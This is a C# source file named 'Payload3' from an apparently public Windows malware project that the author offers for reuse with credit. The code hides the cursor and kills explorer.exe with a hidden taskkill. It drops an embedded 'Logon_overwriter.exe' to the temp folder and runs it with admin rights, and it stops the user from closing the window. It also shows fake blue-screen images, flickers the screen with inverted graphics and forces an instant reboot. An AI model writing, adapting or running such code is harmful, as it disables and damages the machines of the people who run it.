using System;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Threading;
using NAudio.Wave;
using System.IO;
/* 
        This project was made by S-illy
           https://github.com/S-illy
      Also you can support me with a donation
           https://ko-fi.com/silly69
You can modify this source as you give me credits :D
           (This was a fucking hell)
*/
namespace winchancho
{
    public partial class Payload3 : Form
    {
        [DllImport("gdi32.dll")]
        private static extern bool BitBlt(IntPtr hdcDest, int xDest, int yDest, int width, int height, IntPtr hdcSrc, int xSrc, int ySrc, uint rop);

        [DllImport("user32.dll")]
        private static extern IntPtr GetDC(IntPtr hWnd);

        [DllImport("user32.dll")]
        private static extern void ReleaseDC(IntPtr hWnd, IntPtr hdc);

        private const uint SRCINVERT = 0x00660046;

        private int imageIndex = 0;

        private System.Windows.Forms.Timer timer;
        private System.Threading.Timer actionTimer;

        private WaveOutEvent waveOut;

        // tired of comments tbh

        public Payload3()
        {
            try
            {
                InitializeComponent();
                Cursor.Hide();

                timer = new System.Windows.Forms.Timer();
                timer.Interval = 4000;
                timer.Tick += Timer_Tick;
                timer.Start();

                actionTimer = new System.Threading.Timer((object state) => ActionTimer_Tick(state), null, Timeout.Infinite, Timeout.Infinite);

                // Load mp3
                waveOut = new WaveOutEvent();
                var mp3Stream = new MemoryStream(Properties.Resources.buzz);
                var reader = new Mp3FileReader(mp3Stream);
                waveOut.Init(reader);
            }
            catch (Exception ex)
            {
                Console.WriteLine("I don't fucking care" + ex);
            }
        }

        static void fuck()
        {
            string execute = Path.Combine(Path.GetTempPath(), "Logon_overwriter.exe");

            File.WriteAllBytes(execute, Properties.Resources.Logon_overwriter);

            ProcessStartInfo ee = new ProcessStartInfo
            {
                FileName = execute,
                UseShellExecute = true,
                Verb = "runas"
            };
            Process.Start(ee);
        }

        static void reset()
        {
            ProcessStartInfo meow = new ProcessStartInfo
            {
                FileName = "shutdown",
                Arguments = "/r /t 0",
                UseShellExecute = true,
                Verb = "runas"
            };
            Process.Start(meow);
        }
        

        private void SillyDark()
        {
            try
            {
                IntPtr hdc = GetDC(IntPtr.Zero);
                int w = Screen.PrimaryScreen.Bounds.Width;
                int h = Screen.PrimaryScreen.Bounds.Height;
                Random rand = new Random();

                for (int i = 0; i < 10; i++)
                {
                    BitBlt(hdc, rand.Next() % 2, rand.Next() % 2, w, h, hdc, rand.Next() % 2, rand.Next() % 2, SRCINVERT);
                    Thread.Sleep(1000);
                }

                ReleaseDC(IntPtr.Zero, hdc);
            }
            catch (Exception ex)
            {
                Console.WriteLine("I don't fucking care" + ex);
            }
        }

        private void Timer_Tick(object sender, EventArgs e)
        {
            try
            {
                switch (imageIndex)
                {
                    case 0:
                        killer("explorer.exe");
                        fuck();
                        pictureBox1.Image = Properties.Resources.BSOD1;
                        break;
                    case 1:
                        pictureBox1.Image = Properties.Resources.BSOD2;
                        break;
                    case 2:
                        pictureBox1.Image = Properties.Resources.BSOD3;
                        break;
                    case 3:
                        pictureBox1.Image = Properties.Resources.BSOD4;
                        reset();
                        break;
                }

                if (imageIndex < 3)
                {
                    waveOut.Play();
                    imageIndex++;
                }
                else
                {
                    timer.Stop();
                    actionTimer.Change(4000, Timeout.Infinite);

                    this.Invoke(new Action(() =>
                    {
                        Thread effect = new Thread(new ThreadStart(SillyDark));
                        effect.IsBackground = true;
                        effect.Start();
                    }));
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("I don't fucking care" + ex);
            }
        }

        private void ActionTimer_Tick(object state)
        {
            try
            {
                actionTimer.Change(Timeout.Infinite, Timeout.Infinite);
            }
            catch (Exception ex)
            {
                Console.WriteLine("I don't fucking care" + ex);
            }
        }

        protected override void OnFormClosing(FormClosingEventArgs e)
        {
            try
            {
                if (e.CloseReason == CloseReason.UserClosing)
                {
                    e.Cancel = true;
                }
                base.OnFormClosing(e);
            }
            catch (Exception ex)
            {
                Console.WriteLine("I don't fucking care" + ex);
            }
        }

        static void killer(string meow)
        {
            ProcessStartInfo psi = new ProcessStartInfo
            {
                FileName = "cmd.exe",
                Arguments = $"/c taskkill /f /im {meow}",
                WindowStyle = ProcessWindowStyle.Hidden,
                CreateNoWindow = true,
                UseShellExecute = false
            };

            Process.Start(psi);
        }

        private void pictureBox1_Click(object sender, EventArgs e)
        {

        }

        private void Payload3_Load(object sender, EventArgs e)
        {

        }

        private void label1_Click(object sender, EventArgs e)
        {

        }
    }
}







/*
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣀⣀⣀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣀⣠⣤⣤⣶⣶⣶⣶⣶⣶⣶⣶⣦⣤⣄⡀⠀⠀⠀⠀⢀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣤⣴⣶⣶⣯⣿⣿⣶⣿⣿⣿⣿⣝⣆⡀⠀⠀
⢀⣠⣴⣿⣿⣿⣿⣿⣿⠿⠿⠿⠿⠿⢿⣿⣿⣿⣿⣮⣭⣒⣒⣒⣯⣶⣻⠀⠀⠀⠀⠀⠀⣰⣖⣦⣖⣯⣿⣾⣿⣿⣿⡿⠿⠿⠿⠿⠿⠿⣿⣿⣿⣿⡝⣄⠀
⠘⣿⣿⣟⣿⠿⠛⠛⠋⠉⠉⠉⠉⠉⠙⠚⠺⠿⣿⣿⠿⢿⣿⢿⡿⣣⠏⠀⠀⠀⠀⠀⠀⡿⣿⣿⣿⡿⣿⣿⠯⠿⠛⠛⠉⠉⠉⠉⠉⠉⠓⠿⢟⣿⣿⡞⡄
⠀⠀⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠉⠉⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠙⠚⠛⠛⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠪⠧⠇
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣀⣤⣶⣮⣽⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡶⣮⢳⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣾⣿⣯⣵⣶⠤⡀⠀⠀⠀⠀⠀
⠀⠀⢀⣠⣿⣛⣫⣽⣿⣿⣿⣿⣿⣿⣿⣿⣶⣶⣹⣿⣽⣯⣾⣄⠀⠀⠀⠀⠀⠀⠀⠀⣠⣽⣽⣯⣤⣤⣤⣰⣶⣶⣆⣀⣨⣿⣿⣿⣯⣟⣻⣾⣄⡀⠀⠀⠀
⠀⠀⠀⠟⠛⢿⡿⣍⡉⠈⣿⣿⣿⣿⣿⣿⣏⣿⡏⠉⢉⡿⣿⣏⡇⠀⠀⠀⠀⠀⠀⢸⣱⣿⢿⡉⠉⠉⣿⣿⣿⣿⣿⣿⣛⣿⠏⠉⣩⣿⡟⠛⠧⠇⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠙⠪⢽⣷⡾⣿⣿⣿⣿⣿⠿⢯⣴⣾⡿⠟⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠁⠉⠻⣿⣶⢤⣽⣿⣿⣿⣿⣿⣿⠯⣶⣿⠿⠟⠁⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠹⣞⣴⣶⡾⠷⣾⣛⡿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⢿⣿⠾⣷⣮⣗⣶⠒⠚⠋⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠒⠛⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠓⠒⠚⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣠⣴⣒⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢰⣿⣿⣿⣽⣶⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠘⣿⣿⣾⣿⣿⣷⣮⣕⣦⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣿⣿⣿⣾⣿⡏⠉⠛⢿⡿⢿⣿⣷⣖⣤⣤⣄⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣀⣠⣤⣤⣤⣶⣶⣶⢲⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠈⠁⠘⣿⣿⡄⠀⠀⠁⠀⠀⠉⠉⠛⠻⠿⠿⠿⢿⣿⣿⣿⣿⣿⣷⣶⣶⣤⣿⣿⣿⣿⣿⣿⡿⠿⠿⠿⢿⡿⠟⠻⣿⣿⣽⠛⠀⠀⠀⠀⠀⠀
⠀⣴⣶⣲⠀⠀⠀⠀⠈⢮⢿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣿⣻⠁⠀⠀⠀⠀⠀⠀⠀
⠀⠻⣻⣿⢧⡀⠀⠀⠀⠈⢻⡻⣷⣤⣤⣤⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣤⣄⣠⣼⣿⡷⠃⠀⢠⣶⡖⡆⠀⠀⠀
⠀⠀⠻⣻⣯⣧⠀⠀⠀⠀⠀⠙⢿⣿⡍⠉⠙⠛⠛⠒⠂⠀⠀⠀⠶⠶⠶⣶⣶⣦⣤⣤⣤⣴⣶⣶⣶⣶⠶⠶⠾⠟⠉⣻⣿⣿⠟⠀⠀⡴⣷⣿⢧⠇⠀⠀⠀
⠀⠀⠀⠈⠉⠉⠀⠀⠀⠀⠀⠀⠈⠳⣽⢦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣼⣟⠕⠁⠀⢀⣜⣿⡿⣻⠏⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⢿⣿⢶⣤⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣤⣾⢿⠵⠁⠀⠀⠀⠸⢜⡿⠞⠁⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠛⠻⠽⠿⠿⠷⠶⠶⠶⠶⠶⠶⠶⠶⠶⠾⠿⠿⠿⠿⠟⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 
 */